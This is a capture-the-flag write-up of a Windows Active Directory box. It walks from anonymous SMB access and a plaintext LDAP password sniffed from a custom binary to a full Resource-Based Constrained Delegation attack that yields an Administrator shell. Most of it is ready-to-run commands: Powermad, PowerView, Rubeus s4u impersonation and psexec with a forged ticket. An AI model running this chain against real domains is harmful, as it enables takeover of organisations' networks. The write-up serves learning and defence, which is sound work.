# Support (Easy)

Anonymous SMB share with a custom .NET tool that leaks LDAP credentials over the wire, followed by a Resource-Based Constrained Delegation (RBCD) attack to Domain Admin.

## Enumeration

```bash
sudo nmap -sC -sV -oA nmap/support <target>
```

SMB (445) open. Anonymous share enumeration:

```bash
crackmapexec smb <target> --shares -u 'DoesNotExist' -p ''
```

A non-standard share, `support-tools`, was accessible:

```bash
smbclient -N //<target>/support-tools
get UserInfo.exe.zip
```

## Foothold — LDAP credential capture via a custom binary

Running `UserInfo.exe` locally failed to resolve `support.htb`. After adding it to `/etc/hosts` and re-running the tool while capturing traffic with Wireshark, an LDAP bind was observed carrying a **plaintext password** for the `ldap` service account (redacted — `<REDACTED>`).

```bash
crackmapexec smb <target> --shares -u 'ldap' -p '<REDACTED>'
```

This unlocked read access to `NETLOGON`/`SYSVOL`. Running BloodHound:

```bash
sudo bloodhound-python -d support.htb -u 'ldap' -p '<REDACTED>' -ns <target> -c all
```

LDAP dump (`ldapsearch`) also revealed a password hidden in a user's `info` attribute, belonging to the `support` service account (also redacted). Validated with CrackMapExec.

```bash
evil-winrm -i <target> -u SUPPORT -p '<REDACTED>'
```

## Privilege Escalation — RBCD (Resource-Based Constrained Delegation)

BloodHound showed the `SUPPORT` account has **GenericAll** over the domain object (Help panel → Windows Abuse). Tooling (Powermad, PowerView, SharpCollection) was uploaded to a world-writable `ProgramData` folder and served over HTTP.

1. Confirm machine account quota allows adding computer accounts:
   ```powershell
   Get-DomainObject -Identity 'DC=SUPPORT,DC=HTB' | select ms-ds-machineaccountquota
   ```
2. Add an attacker-controlled computer account:
   ```powershell
   New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString '<REDACTED>' -AsPlainText -Force)
   ```
3. Build a security descriptor granting that computer's SID full control, and write it to the target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity`:
   ```powershell
   $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
   $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
   $SDBytes = New-Object byte[] ($SD.BinaryLength)
   $SD.GetBinaryForm($SDBytes, 0)
   Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
   ```
4. Convert the attacker account's password to its RC4 (NTLM) form and request a service ticket impersonating Administrator:
   ```powershell
   Rubeus.exe hash /password:<REDACTED>
   Rubeus.exe s4u /user:attackersystem$ /rc4:<REDACTED> /impersonateuser:administrator /msdsspn:cifs/<TargetComputer> /ptt
   ```
5. Convert and use the resulting ticket:
   ```bash
   mv ticket.kirbi ticket.kirbi.b64
   base64 -d ticket.kirbi.b64 > ticket.kirbi
   ticketConverter.py ticket.kirbi ticket.ccache
   KRB5CCNAME=ticket.ccache psexec.py -k -no-pass support.htb/administrator@dc.support.htb
   ```
→ Administrator shell obtained.

## Takeaways

- Never ship internal tooling that transmits plaintext LDAP credentials unencrypted — capture it with Wireshark/tcpdump during recon.
- GenericAll on a domain object combined with a non-zero `ms-ds-machineaccountquota` is a direct path to RBCD-based domain compromise.
